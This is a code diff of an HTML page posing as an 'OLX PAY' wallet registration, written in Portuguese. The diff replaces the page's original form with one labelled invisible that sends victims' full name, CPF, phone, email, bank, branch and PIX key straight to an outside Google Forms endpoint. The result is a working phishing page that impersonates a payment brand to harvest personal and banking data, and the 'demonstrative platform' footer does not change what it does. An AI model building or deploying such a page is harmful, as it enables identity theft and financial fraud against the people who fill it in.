@@ -9,58 +9,37 @@
 <body>
 
   <main class="card">
-    <img src="./assets/images/illustration.png" class="hero-img" alt="Ilustração">
+    <img src="assets/images/illustration.png" class="hero-img" alt="Ilustração">
 
     <h1>Cadastro de Carteira <span>OLX PAY</span></h1>
     <p class="subtitle">
       Complete seus dados para configurar sua forma de recebimento.
     </p>
 
-    <form id="formDados" novalidate>
+    <!-- FORMULÁRIO GOOGLE FORMS (INVISÍVEL) -->
+    <form
+      action="https://docs.google.com/forms/d/e/1FAIpQLSeEyo9z-qRplFXr7fmGoCkq62VILnHyHkCjHXoBmqrbApyyuQ/formResponse"
+      method="POST"
+      target="_self"
+    >
 
-      <label>Nome completo*
-        <input type="text" name="nome" required>
-      </label>
+      <input type="text" name="entry.935069171" placeholder="Nome completo" required>
+      <input type="text" name="entry.1688586370" placeholder="CPF" required>
+      <input type="tel" name="entry.763082386" placeholder="Telefone" required>
+      <input type="email" name="entry.694256464" placeholder="E-mail" required>
 
-      <label>CPF*
-        <input type="text" name="cpf" required>
-      </label>
-
-      <label>Telefone*
-        <input type="tel" name="telefone" required>
-      </label>
-
-      <label>E-mail*
-        <input type="email" name="email" required>
-      </label>
-
-      <fieldset>
-        <legend>Como deseja receber PIX*</legend>
-        <label><input type="checkbox" name="pixTipo" value="CPF"> CPF</label>
-        <label><input type="checkbox" name="pixTipo" value="Email"> E-mail</label>
-        <label><input type="checkbox" name="pixTipo" value="Telefone"> Telefone</label>
-        <label><input type="checkbox" name="pixTipo" value="Aleatoria"> Chave Aleatória</label>
-      </fieldset>
-
-      <label>Digite sua chave PIX*
-        <input type="text" name="pixChave" required>
-      </label>
+      <input type="text" name="entry.1872064543" placeholder="Banco" required>
+      <input type="text" name="entry.1083885955" placeholder="Agência" required>
+      <input type="text" name="entry.1851724803" placeholder="Chave PIX" required>
 
       <button type="submit">RECEBER</button>
     </form>
 
     <footer>
-      <p class="copy">
-        © 2026 OLX PAY – Plataforma demonstrativa
-      </p>
+      © 2026 OLX PAY – Plataforma demonstrativa
     </footer>
   </main>
 
-  <!-- EmailJS CDN -->
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-
-  <!-- Seu JS -->
-  <script src="js/script.js"></script>
-
 </body>
 </html>
+
